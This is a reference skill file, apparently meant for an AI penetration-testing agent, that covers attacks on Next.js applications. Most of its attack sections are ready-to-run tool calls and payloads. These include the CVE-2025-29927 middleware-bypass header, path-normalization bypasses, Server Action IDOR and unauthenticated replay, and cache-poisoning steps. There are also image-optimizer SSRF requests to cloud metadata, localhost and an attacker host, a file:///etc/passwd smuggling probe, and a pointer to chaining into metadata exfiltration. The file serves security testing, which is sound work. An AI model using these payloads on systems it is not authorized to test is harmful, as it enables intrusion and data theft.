---
name: Next.js
description: Reference for black-box testing Next.js apps covering middleware bypass (CVE-2025-29927-class), Server Actions, RSC cache leaks, image-optimizer SSRF, NextAuth flows, and runtime-divergence gaps.
---

# Next.js

Reference for testing Next.js targets over their public surface: routes, middleware, Server Actions, RSC payloads, image optimizer, NextAuth flows, draft/preview mode, and Edge-vs-Node parity. Pull this in when you fingerprint the stack as Next.js (App or Pages router).

> Black-box scope: probes drive HTTP and observable client artifacts only. The build manifest, source maps, and `__NEXT_DATA__` are public artifacts; reading them is recon, not white-box. There is no source-code analysis step.

## Tool wiring

| Action | Tool | Notes |
|---|---|---|
| HTTP probes | `execute_curl` | Always capture status + selected headers (Set-Cookie, Cache-Control, Content-Type, x-middleware-* ). |
| JS-rendered pages, Server Actions trigger | `execute_playwright` | Captures `Next-Action` headers, hydration data. |
| Crawl static + JS routes | `execute_katana` | `-jc -jsl` extracts route paths from chunks. |
| Pull JS bundles for grep | `execute_curl` then `kali_shell` | Save JS, grep for keys, action IDs, route names. |
| JS analyzer | `kali_shell jsluice` | `jsluice urls /tmp/main.js` extracts endpoints. |

## Stack fingerprint

| Signal | Confirms |
|---|---|
| `x-powered-by: Next.js` | Sometimes present |
| `x-nextjs-cache: HIT/MISS/STALE` | RSC / fetch cache |
| `x-nextjs-data: 1` | Pages-router data fetch |
| `x-middleware-rewrite` / `x-middleware-redirect` | Middleware ran |
| `x-vercel-id` | Hosted on Vercel |
| `<script id="__NEXT_DATA__">...</script>` in HTML | Pages router server-fetched data |
| `<link rel="stylesheet" href="/_next/static/css/...">` | Next.js asset path |
| `_buildManifest.js`, `_ssgManifest.js` under `/_next/static/<buildId>/` | Build artifacts |

## Reconnaissance

### Build manifest (Pages router)

```
GET /_next/static/<buildId>/_buildManifest.js
GET /_next/static/<buildId>/_ssgManifest.js
GET /_next/static/chunks/pages/_app.js
GET /_next/static/chunks/app/layout.js          (App router)
```

In a browser console:

```
console.log(__BUILD_MANIFEST.sortedPages.join('\n'))
JSON.parse(document.getElementById('__NEXT_DATA__').textContent).props.pageProps
Object.keys(process.env).filter(k => k.startsWith('NEXT_PUBLIC_'))
```

The agent equivalent via Playwright:

```
execute_playwright url: "https://target.tld/" script: |
  page.goto("https://target.tld/")
  print(page.evaluate("() => __BUILD_MANIFEST?.sortedPages?.join('\\n')"))
  print(page.evaluate("() => document.getElementById('__NEXT_DATA__')?.textContent"))
```

### Chunk-name route discovery

Chunk filenames map to routes. `chunks/pages/admin.js` -> `/admin`, even when the UI hides the link.

```
execute_curl url: "https://target.tld/_next/static/<buildId>/_buildManifest.js"
kali_shell: curl -s https://target.tld/_next/static/<buildId>/_buildManifest.js | grep -oE '/[a-zA-Z0-9_/[\]\.\-]+' | sort -u
```

### Source maps

```
GET /_next/static/chunks/main-*.js.map
GET /_next/static/chunks/pages/admin-*.js.map
```

If served, they reveal action IDs, prop shapes, and internal function names. Map files in production are an info-disclosure finding by themselves.

### Server Actions discovery

Open the page in `execute_playwright`, click forms / buttons, watch Network for POSTs with header `Next-Action: <id>`. Action IDs are 40-char hex; a leaked source map turns each ID into a function name.

### Public env

```
kali_shell: curl -s https://target.tld/_next/static/chunks/main-*.js | grep -oE '"NEXT_PUBLIC_[A-Z0-9_]+":"[^"]*"' | sort -u
```

`NEXT_PUBLIC_*` are intentionally exposed; `STRIPE_SECRET`, `DATABASE_URL`, `JWT_SECRET` shipped this way are misconfigurations.

### Captured-traffic workflow (proxy_brain tools)

If HTTP Traffic Capture is enabled, source and drive this from the recorded history. `redamon.sitemap` maps the `_next` routes and pages already observed; `redamon.grep` the captured response bodies for `__NEXT_DATA__`, `NEXT_PUBLIC_`, or 40-char hex action IDs to pull data shapes and Server-Action IDs the app already shipped, and `redamon.search {bodyq:"Next-Action"}` finds the captured Action POSTs. Drive the class bugs off real captured requests with `redamon.replay`: add `headers:{"x-middleware-subrequest":"middleware:middleware:middleware:middleware:middleware"}` to a captured protected-route GET to test the CVE-2025-29927 bypass (200 with the protected page vs the original redirect/401); replay a captured Server Action (`headers:{"Next-Action":"<id>"}`, `body:'[{"orderId":"FOREIGN"}]'`) with a foreign ID or `dropHeaders:["Cookie"]` for the authorization-missing probe, and re-replay a stored action ID after a deploy to check ID stability. For the cache boundary, replay one captured URL with the auth cookie and once with `dropHeaders:["Cookie"]`, then `redamon.diff` and watch for `x-nextjs-cache: HIT` handing back the personalized body. Caveats: `redamon.replay` is pinned to the origin host, so victim-side client execution still needs `execute_playwright`; and `proxy_brain` only see traffic that went through the capture proxy.

## Attack matrix

### Middleware bypass

Several CVE-class bugs exist around `middleware.ts`. Most famously CVE-2025-29927 (Next.js < 15.2.3 / 14.2.25 / 13.5.9 / 12.3.5): the `x-middleware-subrequest` header instructs Next.js to skip middleware, so an attacker can reach middleware-protected routes by adding the header.

```
execute_curl url: "https://target.tld/admin" headers: "x-middleware-subrequest: middleware:middleware:middleware:middleware:middleware"
execute_curl url: "https://target.tld/admin" headers: "x-middleware-subrequest: pages/_middleware"
```

If the response no longer redirects / 401s and instead returns the protected page, the target is vulnerable. Pin the version from `_buildManifest.js` and the ` /_next/static/<buildId>/` path; the build ID can change per deploy.

Path-normalization bypasses to test:

```
/admin
/admin/
/admin//
//admin
/api/users
/api//users
/api/./users
/api/%2e/users
/api/users%2f..%2fadmin
/api/users#fragment
```

Middleware may normalize differently from the route handler; if a variant returns 200 while the canonical path returns 401, that is a finding.

Header / parameter pollution:

```
?id=1&id=2          # middleware reads first, handler reads last (or vice versa)
?filter[]=a&filter[]=b
Cookie: session=A; session=B
```

### Server Actions

Server Actions are POST endpoints addressed by the `Next-Action` header. They are reachable outside the UI flow.

```
execute_curl url: "https://target.tld/dashboard" method: "POST" headers: "Next-Action: <action_id>\nContent-Type: text/plain;charset=UTF-8" data: '[{"orderId":"FOREIGN"}]'
```

Probes:

| Probe | Outcome |
|---|---|
| Invoke Action with foreign object IDs | IDOR via action |
| Strip auth cookie | Action authorization missing |
| Switch `Content-Type` to `application/x-www-form-urlencoded` | Parser differential |
| Wrap arrays vs scalars in args | Pydantic-style coercion bugs |
| Replay an Action ID after deploy | Stable action IDs let attacker hold a long-lived backdoor on the route |

### RSC and cache boundary failures

Identity-unaware caching at CDN / edge:

```
# Send request as User A, cache MISS, response sets data
# Then send request without auth cookie, cache HIT, you receive User A's data
execute_curl url: "https://target.tld/api/me"  # repeat with and without Authorization / Cookie
```

Look for:

- `Cache-Control: public` on user-bound responses.
- `Vary: Accept-Encoding` (good) but missing `Authorization` / `Cookie` (bad).
- Identical ETag across users.
- `x-nextjs-cache: HIT` on personalized routes.

ISR / on-demand revalidation:

```
GET /api/revalidate?secret=<guess>&path=/admin
GET /api/revalidate?secret=foo&tag=admin-tag
```

If the secret is weak / leaked, the attacker can poison the cache for everyone. Probe the JS bundle for the secret name; some teams put the constant in `NEXT_PUBLIC_`.

### __NEXT_DATA__ over-fetching

```
execute_curl url: "https://target.tld/profile/USER_B" headers: "Cookie: session=USER_A_COOKIE"
# Inspect <script id="__NEXT_DATA__"> for User B's email/role/internal IDs
```

A page that renders only a username but ships a full user object in `__NEXT_DATA__` leaks the rest. Strip the rendering path and read the raw HTML:

```
kali_shell: curl -s -H "Cookie: session=$A" https://target.tld/profile/USER_B | grep -oE '<script id="__NEXT_DATA__"[^>]*>.+?</script>' | sed -E 's,.*>(.*)</script>,\1,' | jq .
```

### Image optimizer SSRF

The `/_next/image` endpoint loads remote images via `images.domains` / `remotePatterns`. Loose configs let attackers pivot to internal hosts.

```
execute_curl url: "https://target.tld/_next/image?url=http://169.254.169.254/latest/meta-data/&w=64&q=75"
execute_curl url: "https://target.tld/_next/image?url=http://localhost:8000&w=64&q=75"
execute_curl url: "https://target.tld/_next/image?url=http://[::1]/&w=64&q=75"
execute_curl url: "https://target.tld/_next/image?url=http://attacker.tld/redir-to-internal&w=64&q=75"
```

Probes:

- IPv4 numeric variants: `http://2130706433/`, `http://0x7f000001/`, `http://0177.0.0.1/`.
- DNS rebinding: an attacker-controlled host that resolves first to a public IP, then to internal.
- Protocol smuggling: redirect `https://allowed.tld/redir?url=file:///etc/passwd`.

### NextAuth pitfalls

| Probe | Target |
|---|---|
| `callbackUrl=https://attacker.tld` | Allowed-host check |
| Strip `state` / `nonce` from `/api/auth/callback/<provider>` | CSRF / replay |
| Reuse OAuth code | Single-use enforcement |
| Force `provider=...` to a different IdP after login start | Mix-up |
| ID token replay across audiences | `aud` / `iss` strictness |

Pivot: `/skill oauth_oidc` for the full flow matrix.

### Edge vs Node runtime divergence

The same route can run under Edge or Node. Defenses relying on Node-only modules (e.g. `crypto.randomBytes`) get skipped on Edge. Header trust differs (`x-forwarded-*`).

```
# Same path, send variants of headers that differ between Edge and Node
execute_curl url: "https://target.tld/api/protected" headers: "x-forwarded-for: 127.0.0.1"
execute_curl url: "https://target.tld/api/protected" headers: "x-real-ip: 127.0.0.1"
```

### Draft / preview mode

```
GET /api/preview?secret=<guess>&slug=/admin
Set-Cookie: __prerender_bypass=...; __next_preview_data=...
```

Preview cookies bypass authentication on subsequent navigations. The secret is often baked into the bundle.

## Bypass techniques summary

- Content-type switching: `application/json` <-> `multipart/form-data` <-> `application/x-www-form-urlencoded` to hit different parsers.
- Method override: `_method=DELETE`, `X-HTTP-Method-Override: DELETE`, GET on POST endpoints.
- Param duplication: `?id=1&id=2`.
- Trailing slash, double slash, dot segment normalization differentials.
- Cache key confusion: vary on `Accept-Encoding` only without auth-aware Vary.

## Validation shape

A clean Next.js finding includes:

1. Stack fingerprint (Next version + router type).
2. Exact request (URL, headers, body, action ID where relevant).
3. Side-by-side proof (owner vs non-owner; cached vs non-cached).
4. For middleware bypass: explicit header demonstrating the bypass.
5. For `__NEXT_DATA__` leak: cross-user `User A's session` retrieving `User B's PII`.

## Hand-off

```
JWT / NextAuth token issues   -> /skill jwt_attacks, /skill oauth_oidc
SSRF via image optimizer       -> escalate; chain with cloud metadata exfil
Cache poisoning / RSC          -> /skill information_disclosure
Server Action IDOR             -> /skill graphql or class-specific built-ins
Source map / build artifact   -> /skill information_disclosure
```
